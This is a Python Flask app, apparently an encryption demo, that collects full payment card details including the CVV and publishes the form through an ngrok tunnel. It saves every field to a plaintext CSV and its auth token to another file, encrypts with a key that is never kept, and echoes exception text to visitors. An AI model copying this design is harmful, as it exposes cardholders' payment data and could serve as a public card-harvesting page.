from flask import Flask, render_template, request
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from pyngrok import ngrok
from dotenv import load_dotenv
import base64, os, csv

# Load .env variables
load_dotenv()

app = Flask(__name__)

# AES Key (256-bit for AES-256)
key = os.urandom(32)
iv = os.urandom(16)

# Encryption function
def encrypt(plain_text):
    backend = default_backend()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plain_text.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    return base64.b64encode(encrypted).decode()

@app.route('/', methods=['GET', 'POST'])
def index():
    try:
        if request.method == 'POST':
            # Collect data from form
            cardholder = request.form['cardholder']
            card_number = ''.join([
                request.form['card_number_1'],
                request.form['card_number_2'],
                request.form['card_number_3'],
                request.form['card_number_4']
            ])
            exp_month = request.form['exp_month']
            exp_year = request.form['exp_year']
            cvv = request.form['cvv']
            zip_code = request.form['zip_code']

            # Raw data
            raw_data = [cardholder, card_number, exp_month, exp_year, cvv, zip_code]
            with open('input.csv', 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Cardholder', 'Card Number', 'Exp Month', 'Exp Year', 'CVV', 'Zip'])
                writer.writerow(raw_data)

            # Encrypted data
            encrypted_data = [encrypt(field) for field in raw_data]
            with open('encrypted.csv', 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Cardholder', 'Card Number', 'Exp Month', 'Exp Year', 'CVV', 'Zip'])
                writer.writerow(encrypted_data)

            return render_template('form.html', message="Form submitted successfully! Check your files.")

        return render_template('form.html')
    except Exception as e:
        print("Error occurred:", e)
        return "An error occurred: " + str(e), 500

# Save ngrok token
def save_ngrok_token(token):
    with open("ngrok.csv", "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Authtoken"])
        writer.writerow([token])

# Main start point
if __name__ == '__main__':
    # Set and save your authtoken
    AuthNum = os.getenv("NGROK_AUTHTOKEN")
    ngrok.set_auth_token(AuthNum)
    save_ngrok_token(AuthNum)

    # Open ngrok tunnel
    public_url = ngrok.connect(5002)
    print(" * Ngrok tunnel:", public_url)

    # Start Flask app
    app.run(port=5002)